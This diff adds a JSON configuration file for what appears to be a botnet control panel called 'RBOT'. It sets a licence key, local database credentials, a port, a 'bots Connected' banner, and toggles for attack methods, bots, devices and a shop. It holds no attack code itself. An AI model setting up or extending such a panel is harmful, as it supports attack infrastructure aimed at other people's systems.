@@ -1,0 +1,34 @@
+{
+    "key": "U NEED KEYY!!!",
+    "mysql": {
+        "address": "127.0.0.1:3306",
+        "username": "xfdjsa",
+        "password": "dasdwqdqdadsqrerfwfdsfwe",
+        "database": "kgnjdfkng"
+    },
+    "connection": {
+        "port": 999
+    },
+    "branding": {
+        "title": "0 bots Connected ",
+        "prompt": "admin@RBOT >",
+        "assets": {
+            "welcome": "rbot.tfx",
+            "banner": "rbot.tfx",
+            "attack": "attack.tfx"
+        },
+        "hardcoded": {
+            "help": true,
+            "methods": true,
+            "key": true,
+            "tools": true,
+            "devices": true,
+            "gradients_enabled": true,
+            "bots_enabled": true,
+            "theme": true,
+            "attack": true,
+            "chat": true,
+            "shop": true
+        }
+    }
+}
